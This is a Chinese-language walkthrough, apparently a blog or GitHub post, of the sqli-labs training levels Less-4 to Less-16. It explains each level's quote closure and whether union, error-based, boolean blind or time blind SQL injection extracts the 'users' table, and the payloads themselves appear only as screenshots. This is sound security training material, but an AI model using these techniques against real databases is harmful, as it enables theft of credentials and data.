![image](https://github.com/user-attachments/assets/f96da3be-42c0-43b8-a0f6-14320daaaa1b)

## Less-4
这一关以")闭合，其它都同上

![image](https://github.com/user-attachments/assets/d2e290ab-9caf-4ac1-bd24-068193832313)

![image](https://github.com/user-attachments/assets/9fd277c5-63cb-4731-8f06-e7cf79f72bf0)

![image](https://github.com/user-attachments/assets/fa49d3fe-5849-4dab-9863-5625a916cb24)

![image](https://github.com/user-attachments/assets/d4d74d72-3a10-4295-bd2c-792933f39449)

![image](https://github.com/user-attachments/assets/320def5e-dcca-4d0f-aad5-dbf259a86770)

![image](https://github.com/user-attachments/assets/4e16ad6d-3b2c-41fd-8383-f8bbc50cdf47)

## Less-5
正常去做，发现跟前面的不太一样，查询的信息没有回显，可以选择报错注入或者布尔盲注

![image](https://github.com/user-attachments/assets/cc5a8c1f-e7ae-4a05-8a21-d187977bab31)

首先尝试使用报错注入，判断为'闭合

![image](https://github.com/user-attachments/assets/efbce505-898c-4315-a896-14c7a99a04ee)

判断列数，为三列

![image](https://github.com/user-attachments/assets/33a55718-9c37-43f6-80cf-b1dd06bc0196)

通过报错信息判断库的名字为security

![image](https://github.com/user-attachments/assets/e0042a56-6f56-4c47-8d0e-2109f8ea6a97)

或者通过extractValue()函数报错注入获得库名

![image](https://github.com/user-attachments/assets/7d44ca62-aceb-4f9b-a38e-586064b373a5)

接着获得表名

![image](https://github.com/user-attachments/assets/4dc2479f-ceab-4a01-a5a7-279411ae3549)

获得列名

![image](https://github.com/user-attachments/assets/eae16b39-688c-45b8-be58-c449ba9e1251)

获得username和password,但是只返回了32个字符串

![image](https://github.com/user-attachments/assets/03d7b29c-4520-4d4b-8e43-2fe443bc197a)

通过substring解决此问题，最终在第150字符之后获得password

![image](https://github.com/user-attachments/assets/12cdba56-4b03-4cae-a1ea-2b3833542c1b)

## Less-6
判断此题为双引号闭合

![image](https://github.com/user-attachments/assets/bf841a94-cda3-4e79-8ba9-0e5fbfd58f38)

获得库名

![image](https://github.com/user-attachments/assets/d96267f3-854f-40d7-8992-ed3c34f67d26)

获得表名

![image](https://github.com/user-attachments/assets/f730313e-8d97-4552-bd8b-717f253f642f)

获得列名

![image](https://github.com/user-attachments/assets/bd780f8d-e356-48fc-874d-7c618045e7ed)

获得目标

![image](https://github.com/user-attachments/assets/93fb9c46-41d5-46ca-9847-cca52f14f0b7)

## Less-7
这道题发现又不一样，无法显示报错信息了，可以使用布尔盲注

![image](https://github.com/user-attachments/assets/4dc1413c-bb06-4d50-8e43-6abe91b0c3db)

判断闭合方式为'))

![image](https://github.com/user-attachments/assets/0931d233-74ce-419f-9b79-818060d63290)

判断库名长度 长度为8

![image](https://github.com/user-attachments/assets/99524060-aabc-46a0-a5eb-3c1b2314586f)

爆破库名 115 101 99 117 114 105 116 121

![image](https://github.com/user-attachments/assets/89fd443b-59c3-468a-95fe-2525c4a08e62)

爆破表名 117 115 101 114 115

![image](https://github.com/user-attachments/assets/9f4f4c46-9da3-4022-9304-334643126616)

爆破列名

105 100

117 115 101 114 110 97 109 101

112 97 115 115 119 111 114 100

![image](https://github.com/user-attachments/assets/7a8dfd2f-7033-4071-bc1c-4bf083d33ed9)

获得目标......手动注入太繁琐了，之后可以写个脚本

![image](https://github.com/user-attachments/assets/9d441349-8020-4c21-ad98-b5051eee1b34)

## Less-8
这题也可以用布尔盲注，同上一题

## Less-9
这题不管真值假值，页面都没有区别，使用时间盲注

![image](https://github.com/user-attachments/assets/373918cf-4fcb-44bd-a390-063e80d7e3a4)

判断闭合方式为'

![image](https://github.com/user-attachments/assets/044b1c2d-ccf7-482d-8253-db0fe2015b6b)

判断库名长度和库的名称

![image](https://github.com/user-attachments/assets/63999686-46ba-4767-9eba-8c4e88a5d23e)

![image](https://github.com/user-attachments/assets/efb47776-e763-45c3-b0a2-1461856f5a52)

后面同布尔盲注

![image](https://github.com/user-attachments/assets/d7fbb735-c6ae-4ffd-bb2c-c5557d9a54ae)


...

## Less-10
同第九题，用时间盲注即可，只需要将闭合方式改为双引号"

![image](https://github.com/user-attachments/assets/23f2770d-d887-40ca-b16e-f04a8a9eaee2)

## Less-11
这关发现页面改变了，变成账户登录页面，注入点就在输入框里面，即使用post请求提交表单

![image](https://github.com/user-attachments/assets/6fed38d3-9519-46d1-b6a4-793fb0352ba6)

得到闭合方式为单引号',且该sql语句为username='参数' and password='参数'

![image](https://github.com/user-attachments/assets/073ca6b5-5f2d-4a5c-9e6b-686274eaf829)

这里我们使用--+注释就不行，需要换成#来注释

判断出来为两列，由于没有id列所以查询的数字随便填都可以

![image](https://github.com/user-attachments/assets/03487f24-48e1-4c47-b963-4d1442a86f23)

![image](https://github.com/user-attachments/assets/67d657bb-97c2-43d4-8852-5017723ae5ca)

后面就同第一题了

![image](https://github.com/user-attachments/assets/abf0ecc2-1bd9-458e-bc0f-3ad15fef35b4)

![image](https://github.com/user-attachments/assets/57b2286b-1fde-4726-b17b-e80eaeaaf06b)

![image](https://github.com/user-attachments/assets/50ae0f4a-a88f-48c6-88e4-a2e11f4c3ad7)

![image](https://github.com/user-attachments/assets/b08c20b6-f831-4630-8578-4b21cfa129de)

## Less-12
得到以")闭合，其它都同上一题

![image](https://github.com/user-attachments/assets/d3ee6991-c17b-4080-8280-c3d1a592cab6)

## Less-13
以')闭合，其它都同第11题

![image](https://github.com/user-attachments/assets/4725aeba-bc54-4d4b-9252-fbdba3a08e77)

## Less-14
以"闭合，其它都同第11题

![image](https://github.com/user-attachments/assets/2bb5a73b-f50f-4916-85a8-75f67d81232c)

## Less-15
这关需要用布尔盲注，参考第7题，闭合方式为单引号'

![image](https://github.com/user-attachments/assets/e1c9522f-39ec-4594-bde0-c2b4bc6fedeb)

## Less-16
这关也是布尔盲注，闭合方式为")

![image](https://github.com/user-attachments/assets/20ec3d61-4dd0-4e31-83d1-70a945fbc442)
